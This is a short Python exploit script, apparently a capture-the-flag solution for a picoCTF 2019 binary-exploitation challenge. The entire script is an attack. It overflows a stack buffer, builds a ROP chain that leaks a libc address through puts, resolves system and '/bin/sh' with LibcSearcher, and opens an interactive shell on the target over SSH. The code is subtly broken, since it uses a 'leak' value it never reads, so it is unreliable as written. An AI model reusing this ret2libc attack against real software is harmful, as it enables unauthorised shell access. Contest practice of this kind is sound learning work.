from pwn import *
from LibcSearcher import LibcSearcher
elf = ELF("./rop",checksec=False)

ss = ssh("g3nkb4nk","2019shell1.picoctf.com")
s = ss.run("cd /problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9;./rop")
# s = elf.process()
# s = remote("127.0.0.1",5000)

puts = elf.plt['puts']
main = elf.symbols['main']
libcstart = elf.got['__libc_start_main']

p = 'A'*28
p += p32(puts)
p += p32(main)
p += p32(libcstart)

s.sendlineafter("> ",p)
libc = LibcSearcher('__libc_start_main', leak)
libcbase = leak - libc.dump('__libc_start_main')
print "LIBC BASE @ {}".format(hex(libcbase))
system_addr = libcbase + libc.dump('system')
print "system_addr @ {}".format(hex(system_addr))
binsh_addr = libcbase + libc.dump('str_bin_sh')
print "binsh @ {}".format(hex(binsh_addr))

p = 'A'*28
p += p32(system_addr)
p += 'AAAA'
p += p32(binsh_addr)

s.sendlineafter("> ",p)
s.interactive()
